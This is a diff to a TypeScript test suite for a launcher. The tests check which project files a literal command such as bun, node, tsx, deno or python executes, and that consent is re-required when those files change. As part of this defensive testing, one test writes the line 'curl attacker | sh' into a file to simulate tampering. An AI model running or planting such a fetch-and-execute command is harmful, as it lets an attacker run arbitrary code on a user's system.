@@ -31,10 +31,10 @@ describe('files a literal Project command runs', () => {
     ['setup.cmd --fast', ['setup.cmd']],
     // Runtime subcommands, valued flags and versioned interpreters.
     ['deno run -A scripts/x.ts', ['scripts/x.ts']],
-    ['bun run x.ts', ['x.ts']],
-    ['node -r ./register.js --import tsx ./main.ts', ['main.ts']],
+    ['bun run x.ts', ['bunfig.toml', 'package.json', 'node_modules/.bin/x.ts', 'x.ts']],
+    ['node -r ./register.js --import tsx ./main.ts', ['register.js', 'main.ts']],
     ['node -e "require(1)" ./ignored.js', []],
-    ['python3.12 -W ignore manage.py', ['manage.py']],
+    ['python3.12 -W ignore manage.py', ['manage.py', 'manage.py/__main__.py']],
     ['python -m pytest', []],
     ['php -f tools/run.php', ['tools/run.php']],
     // Outside the checkout is not a Project input.
@@ -45,6 +45,10 @@ describe('files a literal Project command runs', () => {
     // Subcommands and valued runtime flags are not the script.
     ['tsx watch src/main.ts', ['src/main.ts']],
     ['node --max-old-space-size 4096 server.js', ['server.js']],
+    ['node --eval="console.log(1)" ignored.js', []],
+    ['python3 -cprint(1) ignored.py', []],
+    ['node - ignored.js', []],
+    ['node -- -entry.js', ['-entry.js']],
   ] as const)('%s', (command, expected) => {
     expect(listLiteralCommandExecutedFiles(root, root, command)).toEqual(
       expected,
@@ -145,6 +149,59 @@ describe('files a literal Project command runs', () => {
       expect(first).toMatchObject({ files: expect.arrayContaining(Object.keys(tree).map(file => ({ file, digest: expect.any(String) }))) });
       await writeFile(join(checkout, runs), 'curl attacker | sh');
       expect(await readLiteralCommandExecutedFiles(checkout, checkout, command)).not.toEqual(first);
+    } finally { await rm(checkout, { recursive: true, force: true }); }
+  });
+
+  it.each([
+    ['bun run app', 'package.json'],
+    ['bun app', 'node_modules/.bin/app'],
+    ['bun ./app.ts', 'bunfig.toml'],
+    ['bun --cwd sub app.ts', 'sub/app.ts'],
+    ['bun run --cwd=sub app.ts', 'sub/app.ts'],
+    ['bun --cwd sub app', 'package.json'],
+    ['bun --cwd sub tool', 'node_modules/.bin/tool'],
+    ['bun --cwd sub app.ts && bash x.sh', 'x.sh'],
+    ['tsx --tsconfig config.json app.js', 'app.ts'],
+    ['tsx app.js', 'app.ts'],
+    ['bun app.js', 'app.ts'],
+    ['bun app; node app', 'app.ts'],
+    ['node app; bun app', 'app.ts'],
+    ['tsx app.mjs', 'app.mts'],
+    ['bun app.mjs', 'app.mts'],
+    ['tsx app.cjs', 'app.cts'],
+    ['bun app.cjs', 'app.cts'],
+    ['tsx app.jsx', 'app.ts'],
+    ['bun app.jsx', 'app.ts'],
+    ['deno run -c config.json app.ts', 'app.ts'],
+    ['deno run --config=config.json app.ts', 'app.ts'],
+    ['node --require ./preload.js app.js', 'preload.js'],
+    ['bash --rcfile config.json x.sh', 'x.sh'],
+    ['python3 -W ignore sub', 'sub/__main__.py'],
+    ['node -r ./preload main.js', 'preload.js'],
+    ['ruby -C sub app.rb', 'sub/app.rb'],
+    ['pwsh -WorkingDirectory sub -File app.ps1', 'app.ps1'],
+  ])('binds consent to the runtime-selected input: %s → %s', async (command, selected) => {
+    const checkout = await mkdtemp(join(tmpdir(), 'happier-launcher-table-'));
+    try {
+      for (const file of ['app.ts', 'sub/app.ts', 'config.json', 'preload.js', 'x.sh']) {
+        await mkdir(join(checkout, file, '..'), { recursive: true });
+        await writeFile(join(checkout, file), file.endsWith('.json') ? '{}' : 'original');
+      }
+      const before = await readLiteralCommandExecutedFiles(checkout, checkout, command);
+      expect(before).toMatchObject({ kind: 'read', files: expect.arrayContaining([expect.objectContaining({ file: selected })]) });
+      await mkdir(join(checkout, selected, '..'), { recursive: true });
+      await writeFile(join(checkout, selected), 'changed by collaborator');
+      expect(await readLiteralCommandExecutedFiles(checkout, checkout, command)).not.toEqual(before);
+    } finally { await rm(checkout, { recursive: true, force: true }); }
+  });
+
+  it.each(['bun run ./app', 'bun ./app.ts', 'node server', '~/x.sh'])('does not refuse ordinary %s', async command => {
+    const checkout = await mkdtemp(join(tmpdir(), 'happier-launcher-positive-'));
+    try {
+      await writeFile(join(checkout, 'app.ts'), 'start()');
+      await mkdir(join(checkout, 'server'));
+      await writeFile(join(checkout, 'server/index.js'), 'start()');
+      expect(await readLiteralCommandExecutedFiles(checkout, checkout, command)).toMatchObject({ kind: 'read' });
     } finally { await rm(checkout, { recursive: true, force: true }); }
   });
 
